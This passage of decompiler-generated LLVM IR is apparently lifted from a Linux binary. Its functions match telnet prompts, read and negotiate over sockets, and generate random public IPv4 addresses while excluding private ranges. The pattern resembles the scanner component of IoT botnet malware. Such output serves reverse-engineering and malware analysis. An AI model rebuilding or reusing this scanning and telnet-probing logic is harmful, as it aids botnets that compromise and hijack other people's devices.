  br label %dec_label_pc_8049739

dec_label_pc_804971f:                             ; preds = %dec_label_pc_80496f9
  %.2 = select i1 %v1_8049727, i32 254, i32 252
  %v5_8049733 = load i32, i32* @edx, align 4
  %v6_8049733 = and i32 %v5_8049733, -256
  %v7_8049733 = or i32 %v6_8049733, %.2
  store i32 %v7_8049733, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049739

dec_label_pc_8049739:                             ; preds = %dec_label_pc_8049703, %dec_label_pc_80496f3, %dec_label_pc_80496e3, %dec_label_pc_804971f
  %v4_8049747 = call i32 @__libc_send(i32 %arg1, i32 %v2_80496ca, i32 1, i32 16384)
  %v1_8049752 = add i32 %arg2, 2
  %v4_8049760 = call i32 @__libc_send(i32 %arg1, i32 %v1_8049752, i32 1, i32 16384)
  %v2_8049772.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804976f

dec_label_pc_804976f:                             ; preds = %dec_label_pc_80496a5, %dec_label_pc_8049739, %entry
  %v2_8049772 = phi i32 [ %v0_8049679, %dec_label_pc_80496a5 ], [ %v2_8049772.pre, %dec_label_pc_8049739 ], [ %v0_8049679, %entry ]
  store i32 %v2_8049772, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-5, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804976f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049739, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8049777 = load i32, i32* @edi, align 4
  store i32 %v0_8049777, i32* %stack_var_-8, align 4
  %v4_8049782 = ptrtoint i8* %arg1 to i32
  %v3_8049793 = call i32 @_strlen(i8* %arg1)
  %v4_8049793 = mul i32 %v3_8049793, -1
  %v1_8049799 = sub i32 0, %v4_8049793
  %v6_80497c0 = sub i32 %v4_8049782, %v4_8049793
  br label %dec_label_pc_8049842

dec_label_pc_80497b0:                             ; preds = %dec_label_pc_8049800, %dec_label_pc_80497e9, %dec_label_pc_80497d2, %dec_label_pc_80497bb
  %v4_80497b0 = add nsw i32 %stack_var_-12.026, 1
  %v7_80497b9 = icmp slt i32 %v4_80497b0, %v1_8049799
  br i1 %v7_80497b9, label %dec_label_pc_80497bb, label %dec_label_pc_80497b3.dec_label_pc_8049817_crit_edge

dec_label_pc_80497b3.dec_label_pc_8049817_crit_edge: ; preds = %dec_label_pc_80497b0, %dec_label_pc_80497b3.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_80497b3.preheader ], [ %v4_80497b0, %dec_label_pc_80497b0 ]
  %.pre = sub i32 %v6_80497c0, %stack_var_-12.0.lcssa
  %.pre10 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049817

dec_label_pc_80497bb:                             ; preds = %dec_label_pc_80497b3.preheader, %dec_label_pc_80497b0
  %stack_var_-12.026 = phi i32 [ %v4_80497b0, %dec_label_pc_80497b0 ], [ %stack_var_-12.1, %dec_label_pc_80497b3.preheader ]
  %v2_80497c8 = sub i32 %v6_80497c0, %stack_var_-12.026
  %v1_80497cc = inttoptr i32 %v2_80497c8 to i8*
  %v2_80497cc = load i8, i8* %v1_80497cc, align 1
  %v4_80497ce = icmp eq i8 %v2_80497cc, 0
  br i1 %v4_80497ce, label %dec_label_pc_80497b0, label %dec_label_pc_80497d2

dec_label_pc_80497d2:                             ; preds = %dec_label_pc_80497bb
  %v2_80497e3 = load i8, i8* %v1_80497cc, align 1
  %v7_80497e5 = icmp eq i8 %v2_80497e3, 32
  br i1 %v7_80497e5, label %dec_label_pc_80497b0, label %dec_label_pc_80497e9

dec_label_pc_80497e9:                             ; preds = %dec_label_pc_80497d2
  %v2_80497fa = load i8, i8* %v1_80497cc, align 1
  %v10_80497fc = icmp eq i8 %v2_80497fa, 13
  br i1 %v10_80497fc, label %dec_label_pc_80497b0, label %dec_label_pc_8049800

dec_label_pc_8049800:                             ; preds = %dec_label_pc_80497e9
  %v2_8049811 = load i8, i8* %v1_80497cc, align 1
  %v10_8049813 = icmp eq i8 %v2_8049811, 10
  br i1 %v10_8049813, label %dec_label_pc_80497b0, label %dec_label_pc_8049817

dec_label_pc_8049817:                             ; preds = %dec_label_pc_8049800, %dec_label_pc_80497b3.dec_label_pc_8049817_crit_edge
  %stack_var_-12.022 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_80497b3.dec_label_pc_8049817_crit_edge ], [ %stack_var_-12.026, %dec_label_pc_8049800 ]
  %v1_8049828.pre-phi = phi i8* [ %.pre10, %dec_label_pc_80497b3.dec_label_pc_8049817_crit_edge ], [ %v1_80497cc, %dec_label_pc_8049800 ]
  %v2_8049828 = load i8, i8* %v1_8049828.pre-phi, align 1
  %v6_804982d = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_805297c.31 to i32)
  %v1_8049830 = inttoptr i32 %v6_804982d to i8*
  %v2_8049830 = load i8, i8* %v1_8049830, align 1
  %v15_8049832 = icmp eq i8 %v2_8049828, %v2_8049830
  %v1_8049834 = icmp eq i1 %v15_8049832, false
  br i1 %v1_8049834, label %dec_label_pc_804983f, label %dec_label_pc_804986c

dec_label_pc_804983f:                             ; preds = %dec_label_pc_8049817
  %v4_804983f = add i32 %storemerge3, 1
  br label %dec_label_pc_8049842

dec_label_pc_8049842:                             ; preds = %entry, %dec_label_pc_804983f
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.022, %dec_label_pc_804983f ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v4_804983f, %dec_label_pc_804983f ]
  %v3_8049856 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805297c.31, i32 0, i32 0))
  %v7_804985d = icmp ult i32 %storemerge3, %v3_8049856
  br i1 %v7_804985d, label %dec_label_pc_80497b3.preheader, label %dec_label_pc_804986c

dec_label_pc_80497b3.preheader:                   ; preds = %dec_label_pc_8049842
  %v7_80497b925 = icmp slt i32 %stack_var_-12.1, %v1_8049799
  br i1 %v7_80497b925, label %dec_label_pc_80497bb, label %dec_label_pc_80497b3.dec_label_pc_8049817_crit_edge

dec_label_pc_804986c:                             ; preds = %dec_label_pc_8049842, %dec_label_pc_8049817
  %storemerge = phi i32 [ 1, %dec_label_pc_8049817 ], [ 0, %dec_label_pc_8049842 ]
  %v2_8049872 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049872, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_80497c0, { 1, 0 }
  uselistorder [6 x i8]* @global_var_805297c.31, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049842, { 1, 0 }
  uselistorder label %dec_label_pc_80497b3.dec_label_pc_8049817_crit_edge, { 1, 0 }
}

define i32 @readUntil() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049878 = load i32, i32* @edi, align 4
  store i32 %v0_8049878, i32* %stack_var_-8, align 4
  store i32 %tmp18, i32* %stack_var_-168, align 4
  %v2_80498bb = ptrtoint i32* %stack_var_-160 to i32
  %tmp37 = bitcast i32* %stack_var_-160 to i8*
  %v1_80498d5 = urem i32 %tmp12, 32
  %v9_80498d8 = shl i32 1, %v1_80498d5
  %v1_80498e3 = add i32 %tmp12, 1
  %v2_80498e7 = ptrtoint i32* %stack_var_-168 to i32
  %v8_80499b0 = inttoptr i32 %tmp10 to i8*
  %v4_80499c2 = icmp eq i32 %tmp9, 0
  %v1_80499cb = inttoptr i32 %tmp11 to i8*
  %v1_80499e344 = add i32 %tmp22, 2
  %v5_80499e947 = icmp slt i32 %v1_80499e344, %tmp
  br i1 %v5_80499e947, label %dec_label_pc_80499eb.lr.ph, label %dec_label_pc_8049a19

dec_label_pc_80499eb.lr.ph:                       ; preds = %entry
  %v2_80498cf = udiv i32 %tmp12, 32
  %v2_80498d8 = mul nuw nsw i32 %v2_80498cf, 4
  %v3_80498d8 = add nsw i32 %v2_80498d8, -156
  %tmp41 = icmp slt i32 %tmp17, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br label %dec_label_pc_80499eb

dec_label_pc_80498b1:                             ; preds = %dec_label_pc_80499f9, %dec_label_pc_80499eb
  store i32 %v2_80498bb, i32* @edi, align 4
  %v5_80498c2 = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  %v0_80498d8 = load i32, i32* @ebp, align 4
  %v4_80498d8 = add i32 %v3_80498d8, %v0_80498d8
  %v5_80498d8 = inttoptr i32 %v4_80498d8 to i32*
  %v6_80498d8 = load i32, i32* %v5_80498d8, align 4
  %v12_80498d8 = or i32 %v6_80498d8, %v9_80498d8
  store i32 %v12_80498d8, i32* %v5_80498d8, align 4
  %v5_80498fa = call i32 @__libc_select(i32 %v1_80498e3, i32 %v2_80498bb, i32 0, i32 0, i32 %v2_80498e7)
  %tmp38 = icmp slt i32 %v5_80498fa, 1
  br i1 %tmp38, label %dec_label_pc_8049a19, label %dec_label_pc_804990a

dec_label_pc_804990a:                             ; preds = %dec_label_pc_80498b1
  %v5_804990d = add i32 %v4_80499e048, %tmp11
  %v5_8049910 = inttoptr i32 %v5_804990d to i8*
  %v5_804991d = call i32 @__libc_recv(i32 %tmp12, i32 %v5_804990d, i32 1, i32 0)
  %v14_8049928 = icmp eq i32 %v5_804991d, -1
  br i1 %v14_8049928, label %dec_label_pc_8049934, label %dec_label_pc_804992e

dec_label_pc_804992e:                             ; preds = %dec_label_pc_804990a
  %v5_804992e = icmp eq i32 %v5_804991d, 0
  %v1_8049932 = icmp eq i1 %v5_804992e, false
  br i1 %v1_8049932, label %dec_label_pc_8049943, label %dec_label_pc_8049934

dec_label_pc_8049934:                             ; preds = %dec_label_pc_804992e, %dec_label_pc_804990a
  br label %dec_label_pc_8049a23

dec_label_pc_8049943:                             ; preds = %dec_label_pc_804992e
  %v6_8049946 = add i32 %v5_804991d, %v4_80499e048
  %v26_8049946 = inttoptr i32 %v6_8049946 to i8*
  %v2_804994c = load i8, i8* %v5_8049910, align 1
  %v11_804994e = icmp eq i8 %v2_804994c, -1
  %v1_8049950 = icmp eq i1 %v11_804994e, false
  br i1 %v1_8049950, label %dec_label_pc_80499ad, label %dec_label_pc_8049952

dec_label_pc_8049952:                             ; preds = %dec_label_pc_8049943
  %v1_8049955 = add i32 %v5_804990d, 1
  %v5_804995e = call i32 @__libc_recv(i32 %tmp12, i32 %v1_8049955, i32 2, i32 0)
  %v14_8049969 = icmp eq i32 %v5_804995e, -1
  br i1 %v14_8049969, label %dec_label_pc_8049975, label %dec_label_pc_804996f

dec_label_pc_804996f:                             ; preds = %dec_label_pc_8049952
  %v5_804996f = icmp eq i32 %v5_804995e, 0
  %v1_8049973 = icmp eq i1 %v5_804996f, false
  br i1 %v1_8049973, label %dec_label_pc_8049984, label %dec_label_pc_8049975

dec_label_pc_8049975:                             ; preds = %dec_label_pc_804996f, %dec_label_pc_8049952
  br label %dec_label_pc_8049a23

dec_label_pc_8049984:                             ; preds = %dec_label_pc_804996f
  %v6_8049987 = add i32 %v5_804995e, %v6_8049946
  %v26_8049987 = inttoptr i32 %v6_8049987 to i8*
  %v4_8049995 = call i32 @negotiate(i32 %tmp12, i32 %v5_804990d, i32 3)
  %v1_804999d = icmp eq i32 %v4_8049995, 0
  %v1_804999f = icmp eq i1 %v1_804999d, false
  br i1 %v1_804999f, label %dec_label_pc_80499e0.backedge, label %dec_label_pc_80499a1

dec_label_pc_80499e0.backedge:                    ; preds = %dec_label_pc_8049984, %dec_label_pc_80499c2, %dec_label_pc_80499c8
  %stack_var_-32.0.be = phi i8* [ %v26_8049946, %dec_label_pc_80499c2 ], [ %v26_8049946, %dec_label_pc_80499c8 ], [ %v26_8049987, %dec_label_pc_8049984 ]
  %v4_80499e0 = ptrtoint i8* %stack_var_-32.0.be to i32
  %v1_80499e3 = add i32 %v4_80499e0, 2
  %v5_80499e9 = icmp slt i32 %v1_80499e3, %tmp
  br i1 %v5_80499e9, label %dec_label_pc_80499e0.backedge.dec_label_pc_80499eb_crit_edge, label %dec_label_pc_8049a19

dec_label_pc_80499e0.backedge.dec_label_pc_80499eb_crit_edge: ; preds = %dec_label_pc_80499e0.backedge
  %v3_80499eb.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_80499eb

dec_label_pc_80499a1:                             ; preds = %dec_label_pc_8049984
  br label %dec_label_pc_8049a23

dec_label_pc_80499ad:                             ; preds = %dec_label_pc_8049943
  %v4_80499b6 = call i32 @strstr(i32 %tmp11, i8* %v8_80499b0)
  %v1_80499be = icmp eq i32 %v4_80499b6, 0
  %v1_80499c0 = icmp eq i1 %v1_80499be, false
  br i1 %v1_80499c0, label %dec_label_pc_8049a0d, label %dec_label_pc_80499c2

dec_label_pc_80499c2:                             ; preds = %dec_label_pc_80499ad
  br i1 %v4_80499c2, label %dec_label_pc_80499e0.backedge, label %dec_label_pc_80499c8

dec_label_pc_80499c8:                             ; preds = %dec_label_pc_80499c2
  %v2_80499cb = call i32 @matchPrompt(i8* %v1_80499cb)
  %v1_80499d3 = icmp eq i32 %v2_80499cb, 0
  br i1 %v1_80499d3, label %dec_label_pc_80499e0.backedge, label %dec_label_pc_8049a0d

dec_label_pc_80499eb:                             ; preds = %dec_label_pc_80499e0.backedge.dec_label_pc_80499eb_crit_edge, %dec_label_pc_80499eb.lr.ph
  %v3_80499eb = phi i32 [ %tmp18, %dec_label_pc_80499eb.lr.ph ], [ %v3_80499eb.pre, %dec_label_pc_80499e0.backedge.dec_label_pc_80499eb_crit_edge ]
  %v4_80499e048 = phi i32 [ %tmp22, %dec_label_pc_80499eb.lr.ph ], [ %v4_80499e0, %dec_label_pc_80499e0.backedge.dec_label_pc_80499eb_crit_edge ]
  %tmp39 = icmp slt i32 %v3_80499eb, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_80498b1, label %dec_label_pc_80499f9

dec_label_pc_80499f9:                             ; preds = %dec_label_pc_80499eb
  br i1 %tmp42, label %dec_label_pc_80498b1, label %dec_label_pc_8049a19

dec_label_pc_8049a0d:                             ; preds = %dec_label_pc_80499c8, %dec_label_pc_80499ad
  br label %dec_label_pc_8049a23

dec_label_pc_8049a19:                             ; preds = %dec_label_pc_80499e0.backedge, %dec_label_pc_80499f9, %dec_label_pc_80498b1, %entry
  br label %dec_label_pc_8049a23

dec_label_pc_8049a23:                             ; preds = %dec_label_pc_8049a0d, %dec_label_pc_80499a1, %dec_label_pc_8049975, %dec_label_pc_8049934, %dec_label_pc_8049a19
  %v3_8049a23 = phi i32 [ 1, %dec_label_pc_8049a0d ], [ 0, %dec_label_pc_80499a1 ], [ 0, %dec_label_pc_8049975 ], [ 0, %dec_label_pc_8049934 ], [ 0, %dec_label_pc_8049a19 ]
  %v3_8049a29 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8049a29, i32* @edi, align 4
  ret i32 %v3_8049a23

; uselistorder directives
  uselistorder i32 %v5_804995e, { 0, 2, 1 }
  uselistorder i32 %v5_804991d, { 0, 2, 1 }
  uselistorder i32 %v5_804990d, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %tmp12, { 5, 4, 3, 0, 2, 1 }
  uselistorder i32 %tmp11, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049a23, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8049a19, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80499e0.backedge, { 2, 1, 0 }
}

define i32 @getRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8049a31 = load i32, i32* @esi, align 4
  %v0_8049a32 = load i32, i32* @ebx, align 4
  store i32 %v0_8049a32, i32* %stack_var_-12, align 4
  %v2_8049a3d = call i32 @random()
  %v2_8049a4d = ashr i32 %v2_8049a3d, 31
  %v2_8049a50 = zext i32 %v2_8049a3d to i64
  %v4_8049a50 = zext i32 %v2_8049a4d to i64
  %v5_8049a50 = mul nuw i64 %v4_8049a50, 4294967296
  %v6_8049a50 = or i64 %v5_8049a50, %v2_8049a50
  %v10_8049a50 = srem i64 %v6_8049a50, 253
  %v11_8049a50 = trunc i64 %v10_8049a50 to i32
  store i32 %v11_8049a50, i32* @eax, align 4
  %v6_8049a54 = trunc i64 %v10_8049a50 to i8
  %v2_8049a57 = call i32 @random()
  %v2_8049a67 = ashr i32 %v2_8049a57, 31
  %v2_8049a6a = zext i32 %v2_8049a57 to i64
  %v4_8049a6a = zext i32 %v2_8049a67 to i64
  %v5_8049a6a = mul nuw i64 %v4_8049a6a, 4294967296
  %v6_8049a6a = or i64 %v5_8049a6a, %v2_8049a6a
  %v10_8049a6a = srem i64 %v6_8049a6a, 255
  %v11_8049a6a = trunc i64 %v10_8049a6a to i32
  store i32 %v11_8049a6a, i32* @eax, align 4
  %v1_8049a6e = trunc i64 %v10_8049a6a to i8
  %v1_8049a71 = call i32 @random()
  %v2_8049a81 = ashr i32 %v1_8049a71, 31
  %v2_8049a84 = zext i32 %v1_8049a71 to i64
  %v4_8049a84 = zext i32 %v2_8049a81 to i64
  %v5_8049a84 = mul nuw i64 %v4_8049a84, 4294967296
  %v6_8049a84 = or i64 %v5_8049a84, %v2_8049a84
  %v10_8049a84 = srem i64 %v6_8049a84, 255
  %v11_8049a84 = trunc i64 %v10_8049a84 to i32
  store i32 %v11_8049a84, i32* @eax, align 4
  %v1_8049a88 = trunc i64 %v10_8049a84 to i8
  %v1_8049a8b = call i32 @random()
  %v2_8049a9b = ashr i32 %v1_8049a8b, 31
  %v2_8049a9e = zext i32 %v1_8049a8b to i64
  %v4_8049a9e = zext i32 %v2_8049a9b to i64
  %v5_8049a9e = mul nuw i64 %v4_8049a9e, 4294967296
  %v6_8049a9e = or i64 %v5_8049a9e, %v2_8049a9e
  br label %dec_label_pc_8049b0f

dec_label_pc_8049aa7:                             ; preds = %dec_label_pc_8049b61, %dec_label_pc_8049bff, %dec_label_pc_8049bf4, %dec_label_pc_8049bdb, %dec_label_pc_8049bc2, %dec_label_pc_8049bb7, %dec_label_pc_8049ba5, %dec_label_pc_8049b93, %dec_label_pc_8049b7a, %dec_label_pc_8049b48, %dec_label_pc_8049b36, %dec_label_pc_8049b2b, %dec_label_pc_8049b16, %dec_label_pc_8049b0f
  %v0_8049aa7 = call i32 @random()
  %v2_8049ab7 = ashr i32 %v0_8049aa7, 31
  %v2_8049aba = zext i32 %v0_8049aa7 to i64
  %v4_8049aba = zext i32 %v2_8049ab7 to i64
  %v5_8049aba = mul nuw i64 %v4_8049aba, 4294967296
  %v6_8049aba = or i64 %v5_8049aba, %v2_8049aba
  %v10_8049aba = srem i64 %v6_8049aba, 253
  %v11_8049aba = trunc i64 %v10_8049aba to i32
  store i32 %v11_8049aba, i32* @eax, align 4
  %v6_8049abe = trunc i64 %v10_8049aba to i8
  %v2_8049ac1 = call i32 @random()
  %v2_8049ad1 = ashr i32 %v2_8049ac1, 31
  %v2_8049ad4 = zext i32 %v2_8049ac1 to i64
  %v4_8049ad4 = zext i32 %v2_8049ad1 to i64
  %v5_8049ad4 = mul nuw i64 %v4_8049ad4, 4294967296
  %v6_8049ad4 = or i64 %v5_8049ad4, %v2_8049ad4
  %v10_8049ad4 = srem i64 %v6_8049ad4, 255
  %v11_8049ad4 = trunc i64 %v10_8049ad4 to i32
  store i32 %v11_8049ad4, i32* @eax, align 4
  %v1_8049ad8 = trunc i64 %v10_8049ad4 to i8
  %v1_8049adb = call i32 @random()
  %v2_8049aeb = ashr i32 %v1_8049adb, 31
  %v2_8049aee = zext i32 %v1_8049adb to i64
  %v4_8049aee = zext i32 %v2_8049aeb to i64
  %v5_8049aee = mul nuw i64 %v4_8049aee, 4294967296
  %v6_8049aee = or i64 %v5_8049aee, %v2_8049aee
  %v10_8049aee = srem i64 %v6_8049aee, 255
  %v11_8049aee = trunc i64 %v10_8049aee to i32
  store i32 %v11_8049aee, i32* @eax, align 4
  %v1_8049af2 = trunc i64 %v10_8049aee to i8
  %v1_8049af5 = call i32 @random()
  %v2_8049b05 = ashr i32 %v1_8049af5, 31
  %v2_8049b08 = zext i32 %v1_8049af5 to i64
  %v4_8049b08 = zext i32 %v2_8049b05 to i64
  %v5_8049b08 = mul nuw i64 %v4_8049b08, 4294967296
  %v6_8049b08 = or i64 %v5_8049b08, %v2_8049b08
  br label %dec_label_pc_8049b0f

dec_label_pc_8049b0f:                             ; preds = %entry, %dec_label_pc_8049aa7
  %v6_8049a9e.sink = phi i64 [ %v6_8049a9e, %entry ], [ %v6_8049b08, %dec_label_pc_8049aa7 ]
  %stack_var_-15.0 = phi i8 [ %v1_8049a6e, %entry ], [ %v1_8049ad8, %dec_label_pc_8049aa7 ]
  %stack_var_-14.0 = phi i8 [ %v1_8049a88, %entry ], [ %v1_8049af2, %dec_label_pc_8049aa7 ]
  %stack_var_-16.0 = phi i8 [ %v6_8049a54, %entry ], [ %v6_8049abe, %dec_label_pc_8049aa7 ]
  %v10_8049a9e = srem i64 %v6_8049a9e.sink, 255
  %extract.t = trunc i64 %v10_8049a9e to i32
  %v4_8049b0f = sext i8 %stack_var_-16.0 to i32
  %v7_8049b0f = and i32 %extract.t, -256
  %v8_8049b0f = or i32 %v4_8049b0f, %v7_8049b0f
  store i32 %v8_8049b0f, i32* @eax, align 4
  %v4_8049b12 = icmp eq i8 %stack_var_-16.0, 0
  br i1 %v4_8049b12, label %dec_label_pc_8049aa7, label %dec_label_pc_8049b16

dec_label_pc_8049b16:                             ; preds = %dec_label_pc_8049b0f
  store i32 %v8_8049b0f, i32* @eax, align 4
  %v10_8049b19 = icmp eq i8 %stack_var_-16.0, 10
  br i1 %v10_8049b19, label %dec_label_pc_8049aa7, label %dec_label_pc_8049b1d

dec_label_pc_8049b1d:                             ; preds = %dec_label_pc_8049b16
  %v10_8049b20 = icmp eq i8 %stack_var_-16.0, 100
  %v1_8049b22 = icmp eq i1 %v10_8049b20, false
  br i1 %v1_8049b22, label %dec_label_pc_8049b36, label %dec_label_pc_8049b24

dec_label_pc_8049b24:                             ; preds = %dec_label_pc_8049b1d
  %v4_8049b24 = zext i8 %stack_var_-15.0 to i32
  %v6_8049b24 = and i32 %v8_8049b0f, -256
  %v7_8049b24 = or i32 %v6_8049b24, %v4_8049b24
  %tmp45 = icmp ult i8 %stack_var_-15.0, 64
  br i1 %tmp45, label %dec_label_pc_8049b36, label %dec_label_pc_8049b2b

dec_label_pc_8049b2b:                             ; preds = %dec_label_pc_8049b24
  store i32 %v7_8049b24, i32* @eax, align 4
  %v5_8049b2e = icmp slt i8 %stack_var_-15.0, 0
  %v1_8049b30 = icmp eq i1 %v5_8049b2e, false
  br i1 %v1_8049b30, label %dec_label_pc_8049aa7, label %dec_label_pc_8049b36

dec_label_pc_8049b36:                             ; preds = %dec_label_pc_8049b2b, %dec_label_pc_8049b24, %dec_label_pc_8049b1d
  %v6_8049b36 = phi i32 [ %v7_8049b24, %dec_label_pc_8049b2b ], [ %v7_8049b24, %dec_label_pc_8049b24 ], [ %v8_8049b0f, %dec_label_pc_8049b1d ]
  %v7_8049b36 = and i32 %v6_8049b36, -256
  %v8_8049b36 = or i32 %v7_8049b36, %v4_8049b0f
  store i32 %v8_8049b36, i32* @eax, align 4
  %v10_8049b39 = icmp eq i8 %stack_var_-16.0, 127
  br i1 %v10_8049b39, label %dec_label_pc_8049aa7, label %dec_label_pc_8049b41

dec_label_pc_8049b41:                             ; preds = %dec_label_pc_8049b36
  %v7_8049b41 = and i32 %v8_8049b36, -256
  %v8_8049b41 = or i32 %v7_8049b41, %v4_8049b0f
  %v11_8049b44 = icmp eq i8 %stack_var_-16.0, -87
  %v1_8049b46 = icmp eq i1 %v11_8049b44, false
  br i1 %v1_8049b46, label %dec_label_pc_8049b53, label %dec_label_pc_8049b48

dec_label_pc_8049b48:                             ; preds = %dec_label_pc_8049b41
  %v4_8049b48 = zext i8 %stack_var_-15.0 to i32
  %v6_8049b48 = and i32 %v8_8049b41, -256
  %v7_8049b48 = or i32 %v6_8049b48, %v4_8049b48
  store i32 %v7_8049b48, i32* @eax, align 4
  %v11_8049b4b = icmp eq i8 %stack_var_-15.0, -2
  br i1 %v11_8049b4b, label %dec_label_pc_8049aa7, label %dec_label_pc_8049b53

dec_label_pc_8049b53:                             ; preds = %dec_label_pc_8049b48, %dec_label_pc_8049b41
  %v6_8049b53 = phi i32 [ %v7_8049b48, %dec_label_pc_8049b48 ], [ %v8_8049b41, %dec_label_pc_8049b41 ]
  %v7_8049b53 = and i32 %v6_8049b53, -256
  %v8_8049b53 = or i32 %v7_8049b53, %v4_8049b0f
  %v11_8049b56 = icmp eq i8 %stack_var_-16.0, -84
  %v1_8049b58 = icmp eq i1 %v11_8049b56, false
  br i1 %v1_8049b58, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b5a

dec_label_pc_8049b5a:                             ; preds = %dec_label_pc_8049b53
  %v4_8049b5a = zext i8 %stack_var_-15.0 to i32
  %v6_8049b5a = and i32 %v8_8049b53, -256
  %v7_8049b5a = or i32 %v6_8049b5a, %v4_8049b5a
  %tmp46 = icmp ult i8 %stack_var_-15.0, 17
  br i1 %tmp46, label %dec_label_pc_8049b61, label %dec_label_pc_8049b6c

dec_label_pc_8049b61:                             ; preds = %dec_label_pc_8049b5a
  store i32 %v7_8049b5a, i32* @eax, align 4
  br label %dec_label_pc_8049aa7

dec_label_pc_8049b6c:                             ; preds = %dec_label_pc_8049b5a, %dec_label_pc_8049b53
  %v6_8049b6c = phi i32 [ %v7_8049b5a, %dec_label_pc_8049b5a ], [ %v8_8049b53, %dec_label_pc_8049b53 ]
  %v8_8049b6f = icmp eq i8 %stack_var_-16.0, -64
  %v1_8049b71 = icmp eq i1 %v8_8049b6f, false
  br i1 %v1_8049b71, label %dec_label_pc_8049b9e, label %dec_label_pc_8049b73

dec_label_pc_8049b73:                             ; preds = %dec_label_pc_8049b6c
  %v8_8049b6c = or i32 %v6_8049b6c, %v4_8049b0f
  %v4_8049b73 = zext i8 %stack_var_-15.0 to i32
  %v6_8049b73 = and i32 %v8_8049b6c, -256
  %v7_8049b73 = or i32 %v6_8049b73, %v4_8049b73
  %v4_8049b76 = icmp eq i8 %stack_var_-15.0, 0
  %v1_8049b78 = icmp eq i1 %v4_8049b76, false
  br i1 %v1_8049b78, label %dec_label_pc_8049b8c, label %dec_label_pc_8049b7a

dec_label_pc_8049b7a:                             ; preds = %dec_label_pc_8049b73
  %v4_8049b7a = zext i8 %stack_var_-14.0 to i32
  %v7_8049b7a = or i32 %v6_8049b73, %v4_8049b7a
  store i32 %v7_8049b7a, i32* @eax, align 4
  %v10_8049b7d = icmp eq i8 %stack_var_-14.0, 2
  br i1 %v10_8049b7d, label %dec_label_pc_8049aa7, label %dec_label_pc_8049b8c

dec_label_pc_8049b8c:                             ; preds = %dec_label_pc_8049b7a, %dec_label_pc_8049b73
  %v6_8049b85.ph = phi i32 [ %v7_8049b73, %dec_label_pc_8049b73 ], [ %v7_8049b7a, %dec_label_pc_8049b7a ]
  %v8_8049b8538 = or i32 %v6_8049b85.ph, %v4_8049b0f
  %v6_8049b8c = and i32 %v8_8049b8538, -256
  %v7_8049b8c = or i32 %v6_8049b8c, %v4_8049b73
  %v10_8049b8f = icmp eq i8 %stack_var_-15.0, 88
  %v1_8049b91 = icmp eq i1 %v10_8049b8f, false
  br i1 %v1_8049b91, label %dec_label_pc_8049ba5, label %dec_label_pc_8049b93

dec_label_pc_8049b93:                             ; preds = %dec_label_pc_8049b8c
  %v4_8049b93 = zext i8 %stack_var_-14.0 to i32
  %v7_8049b93 = or i32 %v6_8049b8c, %v4_8049b93
  store i32 %v7_8049b93, i32* @eax, align 4
  %v10_8049b96 = icmp eq i8 %stack_var_-14.0, 99
  br i1 %v10_8049b96, label %dec_label_pc_8049aa7, label %dec_label_pc_8049ba5

dec_label_pc_8049b9e:                             ; preds = %dec_label_pc_8049b6c
  %v8_8049b85 = or i32 %v6_8049b6c, %v4_8049b0f
  %v7_8049b9e = and i32 %v8_8049b85, -256
  %v8_8049b9e = or i32 %v7_8049b9e, %v4_8049b0f
  br label %dec_label_pc_8049bb0

dec_label_pc_8049ba5:                             ; preds = %dec_label_pc_8049b93, %dec_label_pc_8049b8c
  %v6_8049b9e.ph = phi i32 [ %v7_8049b8c, %dec_label_pc_8049b8c ], [ %v7_8049b93, %dec_label_pc_8049b93 ]
  %v8_8049b9e41 = or i32 %v6_8049b9e.ph, %v4_8049b0f
  %v6_8049ba5 = and i32 %v8_8049b9e41, -256
  %v7_8049ba5 = or i32 %v6_8049ba5, %v4_8049b73
  store i32 %v7_8049ba5, i32* @eax, align 4
